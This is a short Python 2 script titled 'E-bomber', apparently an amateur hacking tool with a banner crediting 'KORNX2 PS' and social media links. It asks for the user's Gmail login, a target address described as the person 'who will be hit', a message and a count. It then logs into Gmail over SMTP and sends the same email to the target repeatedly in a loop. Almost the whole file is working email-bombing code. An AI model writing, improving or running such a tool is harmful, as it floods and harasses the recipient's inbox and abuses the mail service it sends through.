#!/usr/bin/python
#E-bomber



import os
import smtplib
import getpass
import sys
import time
os.system('clear')
print '\033[36;1m'
print '                                                                    '
print '                                                                    '
print '           [$]#############################################[$]      '
print '            |                                               |       '
print '            |                 Email Bomb                    |       '
print '            |                                               |       '
print '            |               KORNX2 PS                       |       '
print '            |                                               |       '
print '            |        https://www.youtube.com/c/Hacker TH.   |       '
print '            |                                               |       '
print '            |        https://kurdkali.wordpress.com/        |       '
print '            |                                               |       '
print '            | https://www.facebook.com/chanborodchaimongkol |       '
print '           [$]#############################################[$]      '

print '                                                                    '


print '                                           '

print '    '
email = raw_input('Enter name of your email  : ')
print '             '
user = raw_input('Your e-mail name  : ')
print '      '
passwd = getpass.getpass('Password  : ')

print '   '

to = raw_input('\n E-mail of person who will be hit Email of the person to send to : ')


print '    '

body = raw_input('message: ')

print '    '

total = input('Number of transmission: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
sys.exit()
